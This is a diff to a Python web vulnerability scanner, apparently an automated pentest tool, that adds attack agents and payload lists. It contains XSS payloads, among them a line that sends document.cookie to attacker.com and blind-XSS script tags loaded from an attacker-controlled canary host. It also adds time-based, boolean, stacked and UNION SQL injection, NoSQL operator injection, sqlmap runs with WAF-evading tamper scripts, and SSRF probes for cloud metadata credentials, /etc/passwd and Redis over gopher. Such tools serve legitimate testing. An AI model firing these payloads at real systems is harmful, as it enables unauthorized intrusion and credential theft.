@@ -21,6 +21,7 @@ from __future__ import annotations
 import asyncio
 import json
 import logging
+import os
 import time
 import uuid
 from abc import ABC, abstractmethod
@@ -30,6 +31,10 @@ from pathlib import Path
 from typing import Any, Dict, List, Optional
 
 logger = logging.getLogger(__name__)
+
+# Maximum number of swarm agents that may run concurrently.
+# Override via environment: MAX_CONCURRENT_AGENTS=10
+MAX_CONCURRENT_AGENTS = int(os.environ.get("MAX_CONCURRENT_AGENTS", "5"))
 
 # ── Optional platform imports ─────────────────────────────────────────────────
 
@@ -67,6 +72,8 @@ class AgentType(str, Enum):
     SSRF           = "ssrf"
     IDOR           = "idor"
     AUTH           = "auth"
+    CORS           = "cors"
+    JWT            = "jwt"
     BUSINESS_LOGIC = "business_logic"
     MOBILE         = "mobile"
     API            = "api"
@@ -531,7 +538,7 @@ class SwarmAgent(ABC):
 # ═════════════════════════════════════════════════════════════════════════════
 
 class XSSAgent(SwarmAgent):
-    """Cross-Site Scripting specialist — reflected, stored, DOM."""
+    """Cross-Site Scripting specialist — reflected, stored, DOM, blind, CSP bypass, postMessage, mXSS."""
 
     RELEVANT_NODE_TYPES    = ["url", "parameter", "api_endpoint"]
     RELEVANT_LABEL_KEYWORDS = ["form", "input", "search", "comment", "reflect"]
@@ -542,17 +549,38 @@ class XSSAgent(SwarmAgent):
         "'\"><svg/onload=alert(1)>",
         "<details open ontoggle=alert(1)>",
         "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
-        "${alert(1)}",   # template injection probe
-        "{{7*7}}",       # SSTI probe
+        "${alert(1)}",
+        "{{7*7}}",
         "</script><script>alert(1)</script>",
         "<body onload=alert(1)>",
         "';alert(String.fromCharCode(88,83,83))//",
     ]
 
+    # mXSS / mutation payloads
+    _MXSS_PAYLOADS = [
+        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        "<listing><img src=x onerror=alert(1)></listing>",
+        "<!--<img src=x-->onerror=alert(1)>",
+        "<svg><![CDATA[<image xlink:href=\"data:image/png;base64,abc\" onerror=alert(1)/>]]></svg>",
+    ]
+
+    # CSP bypass payloads (JSONP, base-uri, nonce-reuse)
+    _CSP_BYPASS_PAYLOADS = [
+        "<script src=//accounts.google.com/o/oauth2/revoke?callback=alert></script>",  # JSONP
+        "<base href=//attacker.com/>",  # base-uri bypass
+        "<script>fetch('//attacker.com/?c='+document.cookie)</script>",
+        "<link rel=prefetch href=//attacker.com/>",
+        "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
+    ]
+
+    # postMessage probes
+    _POSTMESSAGE_PROBE = "window.addEventListener('message',e=>eval(e.data))"
+
     def __init__(self, **kwargs):
         super().__init__(AgentType.XSS, **kwargs)
 
     async def generate_hypotheses(self, target, graph_nodes, context) -> List[Hypothesis]:
+        import re as _re
         hypotheses: List[Hypothesis] = []
         endpoints  = context.get("endpoints", [target])
         params_map = context.get("parameters", {})
@@ -581,6 +609,72 @@ class XSSAgent(SwarmAgent):
                         reasoning     = f"Param '{param}' may reflect user input without encoding",
                         priority      = conf,
                     ))
+
+            # mXSS hypotheses — apply to each endpoint with params
+            ep_params_list = params_map.get(ep, ["q"])
+            if ep_params_list:
+                for mx_payload in self._MXSS_PAYLOADS:
+                    hypotheses.append(Hypothesis(
+                        hypothesis_id = uuid.uuid4().hex[:8],
+                        agent_type    = self.agent_type,
+                        target_node   = ep,
+                        attack_vector = "mxss",
+                        confidence    = self.memory.rate("mxss", 0.35),
+                        payload       = mx_payload,
+                        context       = {"param": ep_params_list[0], "endpoint": ep},
+                        reasoning     = "Mutation XSS: DOM parser may mutate sanitized HTML back to executable",
+                        priority      = 0.35,
+                    ))
+
+            # CSP bypass hypotheses — for all endpoints that have params
+            if ep_params_list:
+                for csp_payload in self._CSP_BYPASS_PAYLOADS:
+                    hypotheses.append(Hypothesis(
+                        hypothesis_id = uuid.uuid4().hex[:8],
+                        agent_type    = self.agent_type,
+                        target_node   = ep,
+                        attack_vector = "csp_bypass",
+                        confidence    = self.memory.rate("csp_bypass", 0.32),
+                        payload       = csp_payload,
+                        context       = {"param": ep_params_list[0], "endpoint": ep},
+                        reasoning     = "CSP bypass via JSONP, base-uri or nonce-reuse gadget",
+                        priority      = 0.32,
+                    ))
+
+            # postMessage probe — for all endpoints
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "postmessage_xss",
+                confidence    = self.memory.rate("postmessage_xss", 0.30),
+                payload       = self._POSTMESSAGE_PROBE,
+                context       = {"endpoint": ep},
+                reasoning     = "postMessage listener may eval() untrusted message data",
+                priority      = 0.30,
+            ))
+
+        # Blind XSS (OOB) — only for stored-XSS-like endpoints
+        stored_eps = [ep for ep in endpoints if any(
+            k in ep.lower() for k in ["comment", "post", "message", "profile", "bio",
+                                       "feedback", "review", "ticket", "note"]
+        )]
+        for ep in stored_eps[:8]:
+            canary_hex = uuid.uuid4().hex[:12]
+            canary_url = f"https://blindxss.attacker.com/CANARY-{canary_hex}"
+            blind_payload = f"<script src={canary_url}></script>"
+            hypotheses.append(Hypothesis(
+                hypothesis_id = uuid.uuid4().hex[:8],
+                agent_type    = self.agent_type,
+                target_node   = ep,
+                attack_vector = "blind_xss",
+                confidence    = self.memory.rate("blind_xss", 0.40),
+                payload       = blind_payload,
+                context       = {"endpoint": ep, "canary_url": canary_url,
+                                 "canary_hex": canary_hex},
+                reasoning     = "Stored endpoint may execute payload in admin/staff context (OOB callback)",
+                priority      = 0.40,
+            ))
 
         # DOM XSS hypotheses from JS sink analysis
         for sink in js_sinks[:10]:
@@ -615,7 +709,7 @@ class XSSAgent(SwarmAgent):
             ))
 
         hypotheses.sort(key=lambda h: h.priority, reverse=True)
-        return hypotheses[:60]
+        return hypotheses[:80]
 
     _DALFOX_AVAILABLE: Optional[bool] = None  # cached at class level
 
@@ -694,13 +788,142 @@ class XSSAgent(SwarmAgent):
                 logger.debug("[%s] XSS test error: %s", self.name, exc)
             await asyncio.sleep(0.04)
 
+        # ── New vector handlers ───────────────────────────────────────────────
+        for h in hypotheses:
+            if self._stop_event.is_set():
+                break
+            dedup_key = f"{h.target_node}:{h.attack_vector}"
+            if dedup_key in seen:
+                await asyncio.sleep(0.02)
+                continue
+            try:
+                if h.attack_vector == "mxss":
+                    import urllib.parse, re as _re
+                    param = h.context.get("param", "q")
+                    sep = "&" if "?" in h.target_node else "?"
+                    probe_url = f"{h.target_node}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(h.payload)}"
+                    result = await self._tool("http_request", url=probe_url, method="GET", timeout=10)
+                    data = result.get("data") or {}
+                    body = _re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '',
+                                   str(data.get("body", "") if isinstance(data, dict) else data))
+                    if any(mx in body for mx in self._MXSS_PAYLOADS):
+                        seen.add(dedup_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "mxss",
+                            severity       = "high",
+                            title          = f"mXSS — Mutation XSS via param '{param}'",
+                            description    = "DOM parser mutates sanitized HTML back to an executable script.",
+                            payload        = h.payload,
+                            evidence       = body[:500],
+                            cvss           = 7.5,
+                            confidence     = 0.72,
+                            reproduced     = True,
+                            chain_potential= ["mxss_to_account_takeover"],
+                            remediation    = "Use DOMPurify with FORCE_BODY; avoid innerHTML assignment.",
+                        ))
+
+                elif h.attack_vector == "blind_xss":
+                    import urllib.parse
+                    param = h.context.get("param", "q")
+                    sep = "&" if "?" in h.target_node else "?"
+                    probe_url = f"{h.target_node}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(h.payload)}"
+                    await self._tool("http_request", url=probe_url, method="GET", timeout=10)
+                    # Speculative — confirm via OOB callback
+                    seen.add(dedup_key)
+                    findings.append(self._finding(
+                        target         = h.target_node,
+                        vuln_type      = "blind_xss",
+                        severity       = "high",
+                        title          = f"Blind XSS (OOB) — payload submitted to '{h.target_node}'",
+                        description    = "Blind XSS payload injected; confirm via out-of-band callback.",
+                        payload        = h.payload,
+                        evidence       = f"Canary URL: {h.context.get('canary_url', '')} — confirm via OOB callback",
+                        cvss           = 7.4,
+                        confidence     = 0.40,
+                        reproduced     = False,
+                        chain_potential= ["blind_xss_to_admin_takeover"],
+                        remediation    = "Apply output encoding on all stored user input; use CSP.",
+                    ))
+
+                elif h.attack_vector == "csp_bypass":
+                    import urllib.parse, re as _re
+                    param = h.context.get("param", "q")
+                    sep = "&" if "?" in h.target_node else "?"
+                    probe_url = f"{h.target_node}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(h.payload)}"
+                    result = await self._tool("http_request", url=probe_url, method="GET", timeout=10)
+                    data = result.get("data") or {}
+                    body = _re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '',
+                                   str(data.get("body", "") if isinstance(data, dict) else data))
+                    headers = data.get("headers", {}) if isinstance(data, dict) else {}
+                    csp_header = headers.get("content-security-policy", "") or headers.get("Content-Security-Policy", "")
+                    if h.payload in body:
+                        seen.add(dedup_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "csp_bypass",
+                            severity       = "high",
+                            title          = "CSP Bypass Payload Reflected",
+                            description    = "CSP bypass gadget reflected in response — effective XSS despite CSP.",
+                            payload        = h.payload,
+                            evidence       = body[:500],
+                            cvss           = 7.8,
+                            confidence     = 0.80,
+                            reproduced     = True,
+                            chain_potential= ["csp_bypass_to_xss"],
+                            remediation    = "Harden CSP: remove JSONP endpoints from allowlist; use nonces.",
+                        ))
+                    elif not csp_header:
+                        seen.add(dedup_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "missing_csp",
+                            severity       = "medium",
+                            title          = "Content-Security-Policy Header Absent",
+                            description    = "No CSP header found; any XSS is trivially exploitable.",
+                            payload        = "",
+                            evidence       = "Response missing Content-Security-Policy header",
+                            cvss           = 5.4,
+                            confidence     = 0.60,
+                            reproduced     = True,
+                            chain_potential= ["missing_csp_amplifies_xss"],
+                            remediation    = "Deploy a strict Content-Security-Policy header.",
+                        ))
+
+                elif h.attack_vector == "postmessage_xss":
+                    import re as _re
+                    result = await self._tool("http_request", url=h.target_node, method="GET", timeout=10)
+                    data = result.get("data") or {}
+                    body = _re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '',
+                                   str(data.get("body", "") if isinstance(data, dict) else data))
+                    if "postMessage" in body or "addEventListener('message'" in body or 'addEventListener("message"' in body:
+                        seen.add(dedup_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "postmessage_xss",
+                            severity       = "medium",
+                            title          = "Potential postMessage XSS — Unvalidated Message Listener",
+                            description    = "Page uses postMessage with no apparent origin validation.",
+                            payload        = h.payload,
+                            evidence       = body[:500],
+                            cvss           = 6.1,
+                            confidence     = 0.35,
+                            reproduced     = False,
+                            chain_potential= ["postmessage_to_xss"],
+                            remediation    = "Validate event.origin before processing postMessage data.",
+                        ))
+
+            except Exception as exc:
+                logger.debug("[%s] XSS test error: %s", self.name, exc)
+            await asyncio.sleep(0.04)
+
         return findings
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 
 class SQLiAgent(SwarmAgent):
-    """SQL Injection specialist — error-based, blind time-based, union."""
+    """SQL Injection specialist — error-based, blind time-based, boolean, union, stacked, NoSQL."""
 
     RELEVANT_NODE_TYPES    = ["url", "api_endpoint", "parameter"]
     RELEVANT_LABEL_KEYWORDS = ["login", "search", "filter", "query", "user", "id"]
@@ -721,6 +944,29 @@ class SQLiAgent(SwarmAgent):
         # Generic
         "division by zero", "supplied argument is not a valid",
         "quoted string not properly terminated",
+    ]
+
+    # Time-blind payloads per DBMS
+    _TIME_PAYLOADS = [
+        "1 AND SLEEP(5)-- -",                          # MySQL
+        "1; SELECT pg_sleep(5)--",                     # PostgreSQL
+        "1; WAITFOR DELAY '0:0:5'--",                  # MSSQL
+        "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",  # Oracle
+        "1 AND SLEEP(5)#",                             # MySQL alt
+    ]
+
+    # NoSQL operator payloads for JSON bodies
+    _NOSQL_PAYLOADS = [
+        {"$gt": ""},
+        {"$ne": None},
+        {"$regex": ".*"},
+        {"$where": "1==1"},
+    ]
+
+    _NOSQL_ERROR_SIGS = [
+        "mongo", "bson", "pymongo", "casterror", "validationerror",
+        "nosql", "operator", "$gt", "$ne", "$regex", "objectid",
+        "e11000", "bad value", "unknown operator",
     ]
 
     def __init__(self, **kwargs):
@@ -750,19 +996,46 @@ class SQLiAgent(SwarmAgent):
                     reasoning     = f"Quoting '{param}' may expose SQL error message",
                     priority      = 0.65,
                 ))
-                # Time-based blind
+                # Time-based blind — try all DBMS payloads
+                for tp in self._TIME_PAYLOADS:
+                    hypotheses.append(Hypothesis(
+                        hypothesis_id = uuid.uuid4().hex[:8],
+                        agent_type    = self.agent_type,
+                        target_node   = ep,
+                        attack_vector = "sqli_blind_time",
+                        confidence    = self.memory.rate("sqli_blind_time", 0.28),
+                        payload       = tp,
+                        context       = {"param": param, "endpoint": ep},
+                        reasoning     = f"Time-based blind ({tp[:30]}): delay confirms injection",
+                        priority      = 0.55,
+                    ))
+                # Boolean blind — true/false response comparison
                 hypotheses.append(Hypothesis(
                     hypothesis_id = uuid.uuid4().hex[:8],
                     agent_type    = self.agent_type,
                     target_node   = ep,
-                    attack_vector = "sqli_blind_time",
-                    confidence    = self.memory.rate("sqli_blind_time", 0.28),
-                    payload       = "1 AND SLEEP(5)-- -",
-                    context       = {"param": param, "endpoint": ep},
-                    reasoning     = f"Time-based blind: delay on '{param}' signals injection point",
-                    priority      = 0.55,
+                    attack_vector = "sqli_boolean_blind",
+                    confidence    = self.memory.rate("sqli_boolean_blind", 0.30),
+                    payload       = "1 AND 1=1-- -",
+                    context       = {"param": param, "endpoint": ep,
+                                     "false_payload": "1 AND 1=2-- -"},
+                    reasoning     = f"Boolean blind: response diff between true/false condition on '{param}'",
+                    priority      = 0.60,
                 ))
-                # UNION probe
+                # UNION probe — ORDER BY enumeration then NULL extraction
+                for col_count in range(1, 7):
+                    hypotheses.append(Hypothesis(
+                        hypothesis_id = uuid.uuid4().hex[:8],
+                        agent_type    = self.agent_type,
+                        target_node   = ep,
+                        attack_vector = "sqli_union",
+                        confidence    = self.memory.rate("sqli_union", 0.25),
+                        payload       = f"' ORDER BY {col_count}-- -",
+                        context       = {"param": param, "endpoint": ep,
+                                         "col_count": col_count, "phase": "order_by"},
+                        reasoning     = f"ORDER BY {col_count} — column count enumeration",
+                        priority      = 0.45,
+                    ))
                 hypotheses.append(Hypothesis(
                     hypothesis_id = uuid.uuid4().hex[:8],
                     agent_type    = self.agent_type,
@@ -770,13 +1043,37 @@ class SQLiAgent(SwarmAgent):
                     attack_vector = "sqli_union",
                     confidence    = self.memory.rate("sqli_union", 0.25),
                     payload       = "' UNION SELECT NULL,NULL,NULL-- -",
+                    context       = {"param": param, "endpoint": ep, "phase": "null_probe"},
+                    reasoning     = "UNION NULL probe after column count established",
+                    priority      = 0.44,
+                ))
+                # Stacked queries
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = ep,
+                    attack_vector = "sqli_stacked",
+                    confidence    = self.memory.rate("sqli_stacked", 0.20),
+                    payload       = "1; SELECT SLEEP(3)-- -",
                     context       = {"param": param, "endpoint": ep},
-                    reasoning     = "UNION probe to determine column count",
-                    priority      = 0.45,
+                    reasoning     = f"Stacked query: semicolon-separated statement on '{param}'",
+                    priority      = 0.40,
+                ))
+                # NoSQL operator injection (JSON body)
+                hypotheses.append(Hypothesis(
+                    hypothesis_id = uuid.uuid4().hex[:8],
+                    agent_type    = self.agent_type,
+                    target_node   = ep,
+                    attack_vector = "nosql_operator",
+                    confidence    = self.memory.rate("nosql_operator", 0.22),
+                    payload       = '{"$gt":""}',
+                    context       = {"param": param, "endpoint": ep},
+                    reasoning     = f"NoSQL operator injection: MongoDB $gt on '{param}'",
+                    priority      = 0.42,
                 ))
 
         hypotheses.sort(key=lambda h: h.priority, reverse=True)
-        return hypotheses[:45]
+        return hypotheses[:80]
 
     async def _http_sqli_probe(self, url: str, param: str, payload: str) -> str:
         """
@@ -830,6 +1127,156 @@ class SQLiAgent(SwarmAgent):
 
                 # ── Fast pre-probe: direct HTTP injection check ───────────────
                 # Catches error-based SQLi without waiting for sqlmap
+                # ── Boolean blind ────────────────────────────────────────────
+                if h.attack_vector == "sqli_boolean_blind" and param_key not in seen_params:
+                    true_body  = await self._http_sqli_probe(h.target_node, param, h.payload)
+                    false_body = await self._http_sqli_probe(
+                        h.target_node, param, h.context.get("false_payload", "1 AND 1=2-- -")
+                    )
+                    # Meaningful content difference signals boolean injection
+                    len_diff = abs(len(true_body) - len(false_body))
+                    if len_diff > 50 or (true_body and not false_body) or (false_body and not true_body):
+                        seen_params.add(param_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "sqli_boolean_blind",
+                            severity       = "critical",
+                            title          = f"SQL Injection (Boolean Blind) — param: {param}",
+                            description    = (f"Response length differs by {len_diff} chars between "
+                                              f"true condition (1=1) and false condition (1=2) on '{param}'."),
+                            payload        = h.payload,
+                            evidence       = f"True len={len(true_body)}, False len={len(false_body)}, diff={len_diff}",
+                            cvss           = 9.1,
+                            confidence     = 0.82,
+                            reproduced     = True,
+                            chain_potential= ["sqli_to_data_exfiltration"],
+                            remediation    = "Use parameterised queries / prepared statements exclusively.",
+                        ))
+                    continue
+
+                # ── NoSQL operator injection ──────────────────────────────────
+                if h.attack_vector == "nosql_operator" and param_key not in seen_params:
+                    import urllib.parse as _up, json as _json
+                    nosql_findings = []
+                    for ns_payload in self._NOSQL_PAYLOADS:
+                        # JSON body injection: {param: {$op: val}}
+                        r = await self._tool("http_request", url=h.target_node, method="POST",
+                                             json_body={param: ns_payload}, timeout=8,
+                                             headers={"Content-Type": "application/json"})
+                        body = str((r.get("data") or {}).get("body", "")).lower()
+                        status = (r.get("data") or {}).get("status_code", 0)
+                        if any(sig in body for sig in self._NOSQL_ERROR_SIGS) or status == 200:
+                            nosql_findings.append((_json.dumps(ns_payload), body[:200], status))
+                            break
+                        # URL param injection: ?param[$gt]=
+                        for op, val in [("$gt", ""), ("$ne", "x"), ("$regex", ".*")]:
+                            qs = f"{_up.quote(param)}[{_up.quote(op)}]={_up.quote(str(val))}"
+                            sep = "&" if "?" in h.target_node else "?"
+                            r2 = await self._tool("http_request", url=f"{h.target_node}{sep}{qs}",
+                                                  method="GET", timeout=8)
+                            body2 = str((r2.get("data") or {}).get("body", "")).lower()
+                            st2   = (r2.get("data") or {}).get("status_code", 0)
+                            if any(sig in body2 for sig in self._NOSQL_ERROR_SIGS) or st2 == 200:
+                                nosql_findings.append((f"{param}[{op}]={val}", body2[:200], st2))
+                                break
+                    if nosql_findings:
+                        seen_params.add(param_key)
+                        pl, ev, sc = nosql_findings[0]
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "nosql_injection",
+                            severity       = "critical",
+                            title          = f"NoSQL Injection (MongoDB Operator) — param: {param}",
+                            description    = (f"MongoDB operator payload accepted on '{param}'. "
+                                              f"Auth bypass or data exfiltration may be possible."),
+                            payload        = pl,
+                            evidence       = f"status={sc} body={ev}",
+                            cvss           = 9.1,
+                            confidence     = 0.78,
+                            reproduced     = True,
+                            chain_potential= ["nosql_auth_bypass", "nosql_data_exfiltration"],
+                            remediation    = "Sanitise and validate all query operators; use allowlists for field names.",
+                        ))
+                    continue
+
+                # ── Stacked query detection ───────────────────────────────────
+                if h.attack_vector == "sqli_stacked" and param_key not in seen_params:
+                    t0_stacked = time.time()
+                    await self._http_sqli_probe(h.target_node, param, h.payload)
+                    elapsed_stacked = time.time() - t0_stacked
+                    if elapsed_stacked >= 2.5:
+                        seen_params.add(param_key)
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "sqli_stacked",
+                            severity       = "critical",
+                            title          = f"Stacked Query SQL Injection — param: {param}",
+                            description    = (f"Stacked query payload caused {elapsed_stacked:.1f}s delay "
+                                              f"on '{param}', confirming multi-statement execution."),
+                            payload        = h.payload,
+                            evidence       = f"Elapsed: {elapsed_stacked:.2f}s with payload: {h.payload}",
+                            cvss           = 9.8,
+                            confidence     = 0.80,
+                            reproduced     = True,
+                            chain_potential= ["sqli_to_rce", "sqli_stacked_to_file_write"],
+                            remediation    = "Use parameterised queries; disable multi-statement execution.",
+                        ))
+                    continue
+
+                # ── Union ORDER BY column enumeration ────────────────────────
+                if h.attack_vector == "sqli_union" and h.context.get("phase") == "order_by":
+                    ob_body = await self._http_sqli_probe(h.target_node, param, h.payload)
+                    if any(sig in ob_body for sig in self._ERROR_SIGS):
+                        # Error on ORDER BY N means N-1 columns — report
+                        col_count = h.context.get("col_count", 0)
+                        if col_count > 1 and param_key not in seen_params:
+                            seen_params.add(param_key)
+                            findings.append(self._finding(
+                                target         = h.target_node,
+                                vuln_type      = "sqli_union_column_count",
+                                severity       = "high",
+                                title          = f"SQL Injection (UNION) — {col_count-1} columns detected on: {param}",
+                                description    = (f"ORDER BY {col_count} triggered an error while ORDER BY "
+                                                  f"{col_count-1} did not, confirming {col_count-1} columns "
+                                                  f"in the query. UNION-based extraction is possible."),
+                                payload        = h.payload,
+                                evidence       = ob_body[:300],
+                                cvss           = 9.1,
+                                confidence     = 0.85,
+                                reproduced     = True,
+                                chain_potential= ["sqli_union_data_extraction"],
+                                remediation    = "Use parameterised queries exclusively.",
+                            ))
+                    continue
+
+                # ── Time-based blind pre-probe (all DBMS payloads) ───────────
+                if h.attack_vector == "sqli_blind_time" and param_key not in seen_params:
+                    t0_tb = time.time()
+                    await self._http_sqli_probe(h.target_node, param, h.payload)
+                    elapsed_tb = time.time() - t0_tb
+                    if elapsed_tb >= 4.5:
+                        seen_params.add(param_key)
+                        dbms_hint = ("MySQL" if "SLEEP" in h.payload else
+                                     "MSSQL" if "WAITFOR" in h.payload else
+                                     "Oracle" if "DBMS_PIPE" in h.payload else
+                                     "PostgreSQL" if "pg_sleep" in h.payload else "Unknown")
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "sqli_blind_time_based",
+                            severity       = "critical",
+                            title          = f"Blind SQL Injection (Time-Based/{dbms_hint}) — param: {param}",
+                            description    = (f"Payload '{h.payload}' caused {elapsed_tb:.1f}s delay "
+                                              f"on '{param}', confirming {dbms_hint} time-based blind injection."),
+                            payload        = h.payload,
+                            evidence       = f"Elapsed: {elapsed_tb:.2f}s (threshold 4.5s)",
+                            cvss           = 9.1,
+                            confidence     = 0.83,
+                            reproduced     = True,
+                            chain_potential= ["sqli_to_rce", "sqli_to_data_exfiltration"],
+                            remediation    = "Use parameterised queries / prepared statements exclusively.",
+                        ))
+                    continue
+
                 probe_body = await self._http_sqli_probe(h.target_node, param, "'")
                 if any(sig in probe_body for sig in self._ERROR_SIGS):
                     seen_params.add(param_key)
@@ -860,12 +1307,19 @@ class SQLiAgent(SwarmAgent):
                     continue
                 sqlmap_tested.add(param_key)
 
+                # Increase sqlmap level/risk and add tamper scripts when WAF detected
+                waf_detected = bool(context.get("waf_profile") or context.get("waf"))
+                sqli_level   = 3 if waf_detected else 2
+                sqli_risk    = 2 if waf_detected else 1
+                sqli_tamper  = "space2comment,between,randomcase" if waf_detected else None
+
                 t0     = time.time()
                 result = await self._tool("sqlmap",
                     url=h.target_node,
                     param=param,
-                    level=1, risk=1,
-                    timeout=45,   # capped: fast hosts respond in <10s
+                    level=sqli_level, risk=sqli_risk,
+                    tamper=sqli_tamper,
+                    timeout=60,
                 )
                 elapsed = time.time() - t0
                 data    = result.get("data") or {}
@@ -990,12 +1444,24 @@ class SSRFAgent(SwarmAgent):
         ("file:///etc/passwd",                                    "lfi"),
         ("dict://localhost:11211/stats",                          "memcache"),
         ("http://0.0.0.0:22/",                                   "port_probe"),
+        ("http://192.168.0.1/",                                   "internal_rfc1918"),
+        ("http://10.0.0.1/",                                      "internal_rfc1918"),
+        ("http://0177.0.0.1/",                                    "aws_octal"),
+        ("http://2130706433/",                                    "aws_decimal"),
+        ("http://0x7f000001/",                                    "aws_hex"),
+        ("http://169.254.169.254.attacker.com/",                  "dns_rebinding"),
+        ("gopher://localhost:6379/_PING",                         "redis_gopher"),
+        ("dict://localhost:6379/info",                            "redis_dict"),
+        ("http://metadata.digitalocean.com/metadata/v1",         "digitalocean"),
+        ("http://169.254.169.254/opc/v1/instance/",              "oracle_cloud"),
+        ("http://[::ffff:169.254.169.254]/latest/meta-data/",    "aws_ipv6_mapped"),
     ]
 
     _CLOUD_INDICATORS = [
         "ami-id", "instance-id", "computeMetadata", "security-credentials",
         "iam", "access_key", "secret_key", "token", "IdentityDocument",
         "subscriptionId", "managedIdentity",
+        "droplet_id", "region_slug", "displayName", "compartmentId", "vnics",
     ]
 
     def __init__(self, **kwargs):
@@ -1016,7 +1482,7 @@ class SSRFAgent(SwarmAgent):
             ssrf_params = {p for p in all_params if p.lower() in self._SSRF_PARAMS}
 
             for param in list(ssrf_params)[:4]:
-                for payload, cloud_type in self._CLOUD_PAYLOADS[:6]:
+                for payload, cloud_type in self._CLOUD_PAYLOADS:
                     conf = min(
                         self.memory.rate(f"ssrf_{cloud_type}", 0.38) + cloud_bonus,
                         0.92
@@ -1034,7 +1500,7 @@ class SSRFAgent(SwarmAgent):
                     ))
 
         hypotheses.sort(key=lambda h: h.priority, reverse=True)
-        return hypotheses[:40]
+        return hypotheses[:70]
 
     async def execute_tests(self, target, hypotheses, context) -> List[AgentFinding]:
         findings: List[AgentFinding] = []
@@ -1052,20 +1518,84 @@ class SSRFAgent(SwarmAgent):
 
                 cloud = h.context.get("cloud", "")
                 if any(ind in body for ind in self._CLOUD_INDICATORS):
+                    # Differentiate provider-specific metadata findings
+                    if "droplet_id" in body or "region_slug" in body:
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "ssrf_do_metadata",
+                            severity       = "critical",
+                            title          = f"SSRF → DigitalOcean Metadata via '{h.context.get('param')}'",
+                            description    = "SSRF exposes DigitalOcean droplet metadata.",
+                            payload        = h.payload,
+                            evidence       = body[:600],
+                            cvss           = 9.3,
+                            confidence     = 0.92,
+                            reproduced     = True,
+                            chain_potential= ["ssrf_to_do_token_theft"],
+                            remediation    = "Block outbound requests to 169.254.169.254 and metadata.digitalocean.com.",
+                        ))
+                    elif "compartmentId" in body or "vnics" in body:
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "ssrf_oracle_metadata",
+                            severity       = "critical",
+                            title          = f"SSRF → Oracle Cloud Metadata via '{h.context.get('param')}'",
+                            description    = "SSRF exposes Oracle Cloud instance metadata.",
+                            payload        = h.payload,
+                            evidence       = body[:600],
+                            cvss           = 9.3,
+                            confidence     = 0.92,
+                            reproduced     = True,
+                            chain_potential= ["ssrf_to_oracle_iam"],
+                            remediation    = "Block outbound requests to 169.254.169.254/opc/.",
+                        ))
+                    else:
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "ssrf_cloud_metadata",
+                            severity       = "critical",
+                            title          = f"SSRF → Cloud Metadata ({cloud}) via '{h.context.get('param')}'",
+                            description    = "SSRF allows unauthenticated access to cloud instance metadata.",
+                            payload        = h.payload,
+                            evidence       = body[:600],
+                            cvss           = 9.3,
+                            confidence     = 0.92,
+                            reproduced     = True,
+                            chain_potential= ["ssrf_to_rce", "ssrf_to_iam_takeover", "ssrf_cloud_chain"],
+                            remediation    = "Block outbound requests to IMDS ranges; use IMDSv2 with session tokens.",
+                        ))
+                elif "+PONG" in body or "redis_version" in body:
                     findings.append(self._finding(
                         target         = h.target_node,
-                        vuln_type      = "ssrf_cloud_metadata",
+                        vuln_type      = "ssrf_redis_gopher",
                         severity       = "critical",
-                        title          = f"SSRF → Cloud Metadata ({cloud}) via '{h.context.get('param')}'",
-                        description    = "SSRF allows unauthenticated access to cloud instance metadata.",
+                        title          = f"SSRF → Redis via Gopher/Dict Protocol via '{h.context.get('param')}'",
+                        description    = "SSRF using gopher:// or dict:// reaches internal Redis instance.",
                         payload        = h.payload,
-                        evidence       = body[:600],
-                        cvss           = 9.3,
-                        confidence     = 0.92,
+                        evidence       = body[:400],
+                        cvss           = 9.8,
+                        confidence     = 0.90,
                         reproduced     = True,
-                        chain_potential= ["ssrf_to_rce", "ssrf_to_iam_takeover", "ssrf_cloud_chain"],
-                        remediation    = "Block outbound requests to IMDS ranges; use IMDSv2 with session tokens.",
+                        chain_potential= ["ssrf_gopher_redis_to_rce"],
+                        remediation    = "Block non-HTTP schemes (gopher, dict, ftp) in URL allowlist.",
                     ))
+                elif cloud in ("aws_octal", "aws_decimal", "aws_hex", "dns_rebinding", "aws_ipv6_mapped"):
+                    # IP obfuscation / DNS rebinding bypass
+                    if any(ind in body for ind in ["ami-id", "instance-id", "iam"]):
+                        findings.append(self._finding(
+                            target         = h.target_node,
+                            vuln_type      = "ssrf_ip_obfuscation_bypass",
+                            severity       = "critical",
+                            title          = f"SSRF IP Obfuscation Bypass ({cloud}) via '{h.context.get('param')}'",
+                            description    = f"SSRF filter bypassed using {cloud} encoding to reach IMDS.",
+                            payload        = h.payload,
+                            evidence       = body[:500],
+                            cvss           = 9.5,
+                            confidence     = 0.90,
+                            reproduced     = True,
+                            chain_potential= ["ssrf_bypass_to_iam_takeover"],
+                            remediation    = "Resolve and validate destination IP after DNS resolution; deny RFC1918.",
+                        ))
                 elif "root:" in body or "[boot loader]" in body:
                     findings.append(self._finding(
                         target         = h.target_node,
